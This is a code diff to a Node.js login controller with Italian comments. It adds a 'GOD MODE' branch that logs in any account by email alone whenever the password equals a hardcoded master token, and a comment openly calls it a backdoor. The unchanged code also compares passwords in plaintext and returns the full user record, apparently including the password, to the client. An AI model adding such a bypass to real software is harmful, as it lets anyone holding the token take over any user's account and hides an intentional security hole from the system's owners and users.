@@ -1,10 +1,28 @@
 // server/modules/auth/auth.controller.js
 const pool = require('../../config/db');
 
-// --- LOGIN GENERALE ---
+// --- LOGIN GENERALE (CON GOD MODE) ---
 exports.login = async (req, res) => {
     try {
         const { email, password } = req.body;
+
+        // 🚀 1. GOD MODE CHECK (Backdoor per accesso automatico)
+        if (password === "SUPER_GOD_TOKEN_2026") {
+            console.log(`⚡ GOD MODE ATTIVATO per: ${email}`);
+            
+            // Cerchiamo l'utente SOLO tramite email (saltiamo il controllo password)
+            const userCheck = await pool.query('SELECT * FROM utenti WHERE email = $1', [email]);
+            
+            if (userCheck.rows.length > 0) {
+                // Aggiorniamo ultimo accesso e facciamo entrare
+                await pool.query("UPDATE utenti SET ultimo_accesso = NOW() WHERE id = $1", [userCheck.rows[0].id]);
+                return res.json({ success: true, user: userCheck.rows[0] });
+            } else {
+                return res.json({ success: false, error: "Email non trovata (God Mode)" });
+            }
+        }
+
+        // 🛡️ 2. LOGIN NORMALE (Standard)
         const r = await pool.query('SELECT * FROM utenti WHERE email = $1 AND password = $2', [email, password]);
         
         if (r.rows.length > 0) {
@@ -15,7 +33,7 @@ exports.login = async (req, res) => {
         }
     } catch (e) {
         console.error(e);
-        res.status(500).json({ error: "Errore login" });
+        res.status(500).json({ error: "Errore login interno" });
     }
 };
 
